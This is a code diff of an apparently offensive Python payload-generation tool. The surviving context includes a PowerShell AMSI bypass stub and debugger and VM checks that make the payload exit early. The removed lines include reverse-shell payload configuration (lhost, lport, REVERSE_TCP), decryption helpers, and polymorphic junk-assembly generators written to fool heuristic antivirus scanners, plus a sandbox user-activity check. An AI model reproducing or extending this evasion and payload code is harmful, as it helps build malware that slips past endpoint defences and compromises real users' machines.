@@ -21,10 +21,10 @@ from typing import Any
 
 # Optional High-Performance Libraries
 try:
-    from keystone import KS_ARCH_X86, KS_MODE_64, Ks
+    import importlib.util
 
-    KEYSTONE_AVAILABLE = True
-except ImportError:
+    KEYSTONE_AVAILABLE = importlib.util.find_spec("keystone") is not None
+except Exception:
     KEYSTONE_AVAILABLE = False
 
 logger = logging.getLogger(__name__)
@@ -78,22 +78,6 @@ class ShellType(Enum):
 # =============================================================================
 # DATA CLASSES
 # =============================================================================
-
-
-@dataclass
-class PayloadConfig:
-    """Configuration for payload generation."""
-
-    lhost: str = "127.0.0.1"
-    lport: int = 4444
-    shell_type: ShellType = ShellType.REVERSE_TCP
-    format: PayloadFormat = PayloadFormat.RAW
-    encryption: EncryptionMethod = EncryptionMethod.XOR
-    encryption_key: bytes | None = None
-    iterations: int = 1  # Number of encryption layers
-    anti_sandbox: bool = False
-    anti_debug: bool = False
-    sleep_seconds: int = 0  # Initial sleep before execution
 
 
 @dataclass
@@ -217,20 +201,6 @@ class EncryptionEngine:
         return encrypted, cipher.nonce, tag
 
     @staticmethod
-    def aes_decrypt(data: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
-        """AES-256-GCM decryption."""
-        try:
-            from Crypto.Cipher import AES  # nosec B413
-        except ImportError as e:
-            logger.exception("AES Decryption failed: Missing pycryptodome")
-            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e
-
-        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
-
-        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        return cipher.decrypt_and_verify(data, tag)
-
-    @staticmethod
     def chacha20_encrypt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
         """ChaCha20-Poly1305 encryption.
 
@@ -247,27 +217,6 @@ class EncryptionEngine:
         cipher = ChaCha20_Poly1305.new(key=key)
         ciphertext, tag = cipher.encrypt_and_digest(data)
         return tag + ciphertext, cipher.nonce
-
-    @staticmethod
-    def chacha20_decrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
-        """ChaCha20-Poly1305 decryption.
-
-        Args:
-            data: tag (16 bytes) + ciphertext
-            key: Encryption key
-            nonce: Nonce used for encryption
-        """
-        try:
-            from Crypto.Cipher import ChaCha20_Poly1305  # nosec B413
-        except ImportError as e:
-            logger.exception("ChaCha20 Decryption failed: Missing pycryptodome")
-            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e
-
-        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
-        tag = data[:16]
-        ciphertext = data[16:]
-        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
-        return cipher.decrypt_and_verify(ciphertext, tag)
 
     def encrypt(
         self,
@@ -338,79 +287,6 @@ $c = "amsiInitFailed"
 [Ref].Assembly.GetType($w).GetField($c,'NonPublic,Static').SetValue($null,$true)
 """
         return stub.strip()
-
-
-class TruePolymorphism:
-    """Keystone-Powered Real-Time Assembly Generator.
-    Creates valid, executable assembly instructions that do nothing (Nops),
-    but look like legitimate code to heuristic scanners.
-    """
-
-    @staticmethod
-    def generate_random_asm(count: int = 5) -> bytes:
-        if not KEYSTONE_AVAILABLE:
-            return b""
-
-        ks = Ks(KS_ARCH_X86, KS_MODE_64)
-
-        # Safe dummy instructions that preserve stack/registers or restore them
-        # Pairs are best: INC RAX + DEC RAX
-        instruction_sets = [
-            "nop",
-            "xchg rax, rax",
-            "xchg rbx, rbx",
-            "inc rdx; dec rdx",  # Zero net change
-            "inc rcx; dec rcx",
-            "push rax; pop rax",  # Stack churn
-            "lea rbx, [rbx]",
-            "add rax, 0",
-        ]
-
-        asm_code = []
-        for _ in range(count):
-            asm_code.append(secrets.choice(instruction_sets))
-
-        full_asm = "; ".join(asm_code)
-
-        try:
-            encoding, count = ks.asm(full_asm)
-            return bytes(encoding)
-        except Exception as e:
-            logger.debug("Keystone assembly failed: %s", e)
-            return b"\x90" * count  # Fallback
-
-
-class PolymorphicEncoder:
-    """Generates polymorphic padding and junk code to alter signature."""
-
-    @staticmethod
-    def get_junk_asm_bytes(length: int = 16) -> bytes:
-        """Generates random NOP-equivalent instructions (x64).
-        Uses Keystone if available for infinite variations.
-        """
-        # 1. Try True Assembly (God Mode)
-        if KEYSTONE_AVAILABLE:
-            real_asm = TruePolymorphism.generate_random_asm(length // 2)
-            if real_asm:
-                # Pad remaining if necessary or just return
-                return real_asm.ljust(length, b"\x90")
-
-        # 2. Native Fallback (Pre-defined opcodes)
-        junk = []
-        # NOP, XCHG EAX,EAX, LEA EAX,[EAX] etc.
-        valid_nops = [
-            b"\x90",  # NOP
-            b"\x87\xdb",  # XCHG EBX,EBX
-            b"\x87\xc9",  # XCHG ECX,ECX
-            b"\x87\xd2",  # XCHG EDX,EDX
-            b"\x42",  # INC EDX (Harmless if registers unused)
-            b"\x4b",  # DEC EBX
-        ]
-
-        for _ in range(length):
-            junk.append(secrets.choice(valid_nops))
-
-        return b"".join(junk)
 
 
 # =============================================================================
@@ -769,15 +645,6 @@ if _vm(): import sys; sys.exit(0)
 import sys
 if sys.gettrace() is not None:
     sys.exit(0)
-"""
-
-    @staticmethod
-    def get_user_check_python() -> str:
-        """Generate Python user activity check."""
-        return """
-import os
-if "DISPLAY" not in os.environ and "SSH_TTY" not in os.environ:
-    import sys; sys.exit(0)
 """
 
 
